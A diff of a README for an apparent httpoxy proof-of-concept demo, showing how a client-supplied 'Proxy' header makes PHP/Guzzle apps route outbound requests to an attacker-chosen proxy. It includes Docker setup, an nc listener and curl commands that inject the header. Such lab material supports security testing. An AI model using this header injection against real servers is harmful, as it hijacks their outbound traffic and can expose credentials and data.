@@ -1,55 +1,35 @@
-# Guzzle FPM Proxy Vulnerability
+# httpoxy-vuln
 
-Some command-line HTTP clients support a set of environment variables to configure a proxy. These
-are of the form `<protocol>_PROXY`; `HTTP_PROXY` is particularly noteworthy.
-
-Separately, PHP takes user-supplied headers, and sets them as `HTTP_*` in the `$_SERVER` autoglobal.
+Completely and utterly stolen from [php-fpm-httpoxy-poc](https://github.com/httpoxy/php-fpm-httpoxy-poc), however that proof of concept doesn't work out of the box and bending it to a testing end seemed all together decent.
 
 ## Steps
 
 This is how the vulnerability works:
 
-1. Do the usual PHP thing of exposing user-supplied headers as `$_SERVER['HTTP_*']`
-2. Be using Guzzle from FPM or Apache (haven't tested with other SAPIs, assume some others possibly vulnerable too)
-3. As an HTTP client, inject a `Proxy: my-malicious-service` header to any request made
-4. Watch as Guzzle helpfully sends the request to the malicious proxy, supplied by the client
+1. Send a header with 'Proxy: yourproxyserver:port'
+2. notice a request is routed to your proxy
+3. take notice in your proxy server
 
-## Using this repo
+## Using this demo
 
 Here is how you can see it in action:
 
-1. Clean up running instances from the last run:
+1. rebuild and run the whole docker thing
 
-    ```sh
-    docker stop fpm-test-instance > /dev/null 2>&1
-    docker rm   fpm-test-instance > /dev/null 2>&1
+    ```
+    ./rebuild.sh
     ```
 
-2. Start a new test instance of the vulnerable script:
-
-    ```sh
-    docker build -t fpm-guzzle-proxy .
-    docker run -d -p 80:80 --name fpm-test-instance fpm-guzzle-proxy
-    ```
-
-3. Start some sort of capturing proxy, to test whether the request comes through. Note that things interpreting HTTP_PROXY
-    don't seem to care about the path portion of the URL (so, requestb.in won't work). I have had success with `ngrok tcp 9999`,
-    but it requires a paid account. Another one that works well for local testing is:
+2. Start some sort of capturing proxy:
 
     `nc -l 12345`
 
-4. Then, fire a request at your vulnerable script, and watch the data arrive at the user-specified proxy:
+4. to to test a docker container running at 192.168.99.100, out to a proxy running at 192.168.0.6.12345...
+
 
     ```sh
-    curl -H 'Proxy: 0.tcp.ngrok.io:12345' 127.0.0.1
+    curl -H 'Proxy: 192.168.0.6:12345' 192.168.99.100
     ```
 
-    or
-
-    ```sh
-    curl -H 'Proxy: 172.17.0.1:12345' 127.0.0.1
-    ```
-
-    etc.
 
 
